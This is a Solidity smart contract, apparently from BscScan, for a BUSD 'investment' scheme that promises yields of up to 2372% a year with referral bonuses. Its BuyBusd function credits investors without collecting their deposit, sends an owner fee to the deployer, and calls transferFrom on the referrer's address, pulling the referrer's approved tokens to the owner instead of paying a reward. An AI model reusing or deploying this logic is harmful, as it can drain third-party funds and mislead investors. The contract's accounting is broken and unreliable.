/**
 *Submitted for verification at BscScan.com on 2022-10-18
*/

// SPDX-License-Identifier: none
pragma solidity ^0.8.11;

interface BEP20 {
    function totalSupply() external view returns (uint theTotalSupply);
    function balanceOf(address _owner) external view returns (uint balance);
    function transfer(address _to, uint _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint _value) external returns (bool success);
    function approve(address _spender, uint _value) external returns (bool success);
    function allowance(address _owner, address _spender) external view returns (uint remaining);
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}

contract Ownable {
  address public CEO; 

  
  constructor() {
    CEO = msg.sender;
   
  }
  modifier onlyOwner() {
    require(msg.sender == CEO);
    _;
  }
}
contract pureContractBUSD is Ownable {   
   
   struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
  }

  struct Investor {
    bool registered;
    address referer;
    Deposit[] deposits;
    uint invested;
    uint investedBusd;
    uint paidAt;
    uint withdrawn;
    uint firstInvestAt;
    uint maxDeposit;
    uint reInvest;
    uint freeBusd;
    uint userType; //1=customer,2=agent,3=associate,4=diamond
  }

  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public oneDay = 86400; 
  uint public totalInvestors;
  uint public totalInvested;
  uint public berryPricePerBusd = 100;
  uint public ownerFee = 1;
  uint public referIncome = 10;
  uint public bonusIncome = 10;
  address public ownerWalletAddress = msg.sender;
  uint public referralBonus = 10;
  //address public busdToken = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56; //mainnet
  address public busdToken = 0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee; //testnet
  address public contractAddr = address(this);
  mapping (address => Investor) public investors;
  
  event buyAt(address user,  uint amount);
  event Reinvest(address user, uint amount);
  event Sell(address user, uint amount);
  event TransferOwnership(address user);
  

  constructor() {
    tariffs.push(Tariff(365 * oneDay, 2372));
    tariffs.push(Tariff(365 * oneDay, 365));
  }
  
  function BuyBusd(address referer,uint bnbAmount) external {
        require(bnbAmount >= 30,"Minimum Investment 30 Busd");
        bnbAmount = bnbAmount * (10**18); 
      
        require(BEP20(busdToken).allowance(msg.sender,contractAddr)>=bnbAmount,"insufficinet allowance");
        uint tariff = 0;
        

        // owner Fee
        uint ownerFeeAmount = bnbAmount*ownerFee/100; 
        BEP20(busdToken).transferFrom(msg.sender,ownerWalletAddress,ownerFeeAmount);

        // referral Income
        BEP20(busdToken).transferFrom(referer,ownerWalletAddress,referIncome);
    
         if(!investors[msg.sender].registered) {
            investors[msg.sender].registered = true;
            investors[msg.sender].referer = referer;
        }

        if(investors[msg.sender].invested==0){
          investors[msg.sender].firstInvestAt = block.timestamp;
        } 

        uint berryAmt = (bnbAmount*berryPricePerBusd);

        //signup bonus
        if(investors[referer].registered && referer != msg.sender) {
          uint signupBonus = berryAmt*bonusIncome/100;
          berryAmt = berryAmt+signupBonus;
        }
     
        investors[msg.sender].invested += berryAmt;
        investors[msg.sender].investedBusd += bnbAmount;
        totalInvested += berryAmt;

        investors[msg.sender].userType = 1; //
    
       
    }

    function calculateBerry(uint amt) public view returns (uint berrryAmt) {
        berrryAmt = (amt*berryPricePerBusd)/(10**18);
    }
}